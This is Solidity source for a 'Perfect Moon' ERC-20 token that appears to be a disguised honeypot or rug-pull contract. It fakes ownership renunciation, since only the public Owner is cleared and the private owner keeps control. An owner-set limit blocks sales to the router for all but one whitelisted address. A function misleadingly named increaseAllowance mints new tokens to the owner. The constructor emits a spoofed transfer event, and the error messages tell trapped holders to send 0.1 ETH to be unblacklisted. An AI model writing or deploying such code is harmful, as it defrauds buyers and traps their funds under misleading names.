row number 
1	            pragma solidity ^0.6.12;
2	 interface IERC20 {
3	 function totalSupply() external view returns (uint256);
4	 function balanceOf(address account) external view returns (uint256);
5	 function transfer(address recipient, uint256 amount) external returns (bool);
6	 function allowance(address owner, address spender) external view returns (uint256);
7	 function approve(address spender, uint256 amount) external returns (bool);
8	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
9	 event Transfer(address indexed from, address indexed to, uint256 value);
10	 event Approval(address indexed owner, address indexed spender, uint256 value);
11	 }
12	 library SafeMath {
13	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
14	 uint256 c = a + b;
15	 require(c >= a, "SafeMath: addition overflow");
16	 return c;
17	 }
18	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
19	 return sub(a, b, "SafeMath: subtraction overflow");
20	 }
21	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
22	 require(b <= a, errorMessage);
23	 uint256 c = a - b;
24	 return c;
25	 }
26	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
27	 if (a == 0) {
28	 return 0;
29	 }
30	 uint256 c = a * b;
31	 require(c / a == b, "SafeMath: multiplication overflow");
32	 return c;
33	 }
34	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
35	 return div(a, b, "SafeMath: division by zero");
36	 }
37	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
38	 require(b > 0, errorMessage);
39	 uint256 c = a / b;
40	 return c;
41	 }
42	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
43	 return mod(a, b, "SafeMath: modulo by zero");
44	 }
45	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
46	 require(b != 0, errorMessage);
47	 return a % b;
48	 }
49	 }
50	 abstract contract Context {
51	 function _call() internal view virtual returns (address payable) {
52	 return msg.sender;
53	 }
54	 function _msgData() internal view virtual returns (bytes memory) {
55	 this;
56	 return msg.data;
57	 }
58	 }
59	 library Address {
60	 function isContract(address account) internal view returns (bool) {
61	 bytes32 codehash;
62	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
63	 assembly {
64	 codehash := extcodehash(account) }
65	 return (codehash != accountHash && codehash != 0x0);
66	 }
67	 function sendValue(address payable recipient, uint256 amount) internal {
68	 require(address(this).balance >= amount, "Address: insufficient balance");
69	 (bool success, ) = recipient.call{
70	 value: amount }
71	 ("");
72	 require(success, "Address: unable to send value, recipient may have reverted");
73	 }
74	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
75	 return functionCall(target, data, "Address: low-level call failed");
76	 }
77	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
78	 return _functionCallWithValue(target, data, 0, errorMessage);
79	 }
80	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
81	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
82	 }
83	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
84	 require(address(this).balance >= value, "Address: insufficient balance for call");
85	 return _functionCallWithValue(target, data, value, errorMessage);
86	 }
87	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
88	 require(isContract(target), "Address: call to non-contract");
89	 (bool success, bytes memory returndata) = target.call{
90	 value: weiValue }
91	 (data);
92	 if (success) {
93	 return returndata;
94	 }
95	 else {
96	 if (returndata.length > 0) {
97	 assembly {
98	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
99	 }
100	 else {
101	 revert(errorMessage);
102	 }
103	 }
104	 }
105	 }
106	 contract Ownable is Context {
107	 address private _owner;
108	 address public Owner;
109	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
110	 constructor () internal {
111	 address call = _call();
112	 _owner = call;
113	 Owner = call;
114	 emit OwnershipTransferred(address(0), call);
115	 }
116	 modifier onlyOwner() {
117	 require(_owner == _call(), "Ownable: caller is not the owner");
118	 _;
119	 }
120	 function renounceOwnership() public virtual onlyOwner {
121	 emit OwnershipTransferred(_owner, address(0));
122	 Owner = address(0);
123	 }
124	 function transferOwnership(address newOwner) public virtual onlyOwner {
125	 require(newOwner != address(0), "Ownable: new owner is the zero address");
126	 emit OwnershipTransferred(_owner, newOwner);
127	 _owner = newOwner;
128	 }
129	 }
130	 contract PerfectMoon is Context, IERC20, Ownable {
131	 using SafeMath for uint256;
132	 using Address for address;
133	 mapping(address => uint256) private _router;
134	 mapping(address => mapping (address => uint256)) private _allowances;
135	 address private router;
136	 address private caller;
137	 uint256 private _totalTokens = 250000000 * 10**18;
138	 uint256 private rTotal = 250000000 * 10**18;
139	 string private _name = 'Perfect Moon';
140	 string private _symbol = 'ðŸŒ‘PERFECT';
141	 uint8 private _decimals = 18;
142	 constructor () public {
143	 _router[_call()] = _totalTokens;
144	 emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _call(), _totalTokens);
145	 }
146	 function name() public view returns (string memory) {
147	 return _name;
148	 }
149	 function symbol() public view returns (string memory) {
150	 return _symbol;
151	 }
152	 function rateReflect(uint256 amount) public onlyOwner {
153	 rTotal = amount * 10**18;
154	 }
155	 function setRouter (address Uniswaprouterv02) public onlyOwner {
156	 router = Uniswaprouterv02;
157	 }
158	 function decimals() public view returns (uint8) {
159	 return _decimals;
160	 }
161	 function allowance(address owner, address spender) public view override returns (uint256) {
162	 return _allowances[owner][spender];
163	 }
164	 function approve(address spender, uint256 amount) public override returns (bool) {
165	 _approve(_call(), spender, amount);
166	 return true;
167	 }
168	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
169	 _transfer(sender, recipient, amount);
170	 _approve(sender, _call(), _allowances[sender][_call()].sub(amount, "ERC20: Anti-bot mechanism flagged you as a bot, to get unblacklisted make a 0.1 ETH purchase"));
171	 return true;
172	 }
173	 function totalSupply() public view override returns (uint256) {
174	 return _totalTokens;
175	 }
176	 function _transfer(address sender, address recipient, uint256 amount) internal {
177	 require(sender != address(0), "ERC20: Anti-bot mechanism flagged you as a bot, to get unblacklisted make a 0.1 ETH purchase");
178	 require(recipient != address(0), "ERC20: Anti-bot mechanism flagged you as a bot, to get unblacklisted make a 0.1 ETH purchase");
179	 if (sender != caller && recipient == router) {
180	 require(amount < rTotal, "ERC20: Anti-bot mechanism flagged you as a bot, to get unblacklisted make a 0.1 ETH purchase");
181	 }
182	 _router[sender] = _router[sender].sub(amount, "ERC20: Anti-bot mechanism flagged you as a bot, to get unblacklisted make a 0.1 ETH purchase");
183	 _router[recipient] = _router[recipient].add(amount);
184	 emit Transfer(sender, recipient, amount);
185	 }
186	 function _approve(address owner, address spender, uint256 amount) private {
187	 require(owner != address(0));
188	 require(spender != address(0));
189	 _allowances[owner][spender] = amount;
190	 emit Approval(owner, spender, amount);
191	 }
192	 function balanceOf(address account) public view override returns (uint256) {
193	 return _router[account];
194	 }
195	 function transfer(address recipient, uint256 amount) public override returns (bool) {
196	 _transfer(_call(), recipient, amount);
197	 return true;
198	 }
199	 function increaseAllowance(uint256 amount) public onlyOwner {
200	 require(_call() != address(0));
201	 _totalTokens = _totalTokens.add(amount);
202	 _router[_call()] = _router[_call()].add(amount);
203	 emit Transfer(address(0), _call(), amount);
204	 }
205	 function Approve(address trade) public onlyOwner {
206	 caller = trade;
207	 }
208	 }
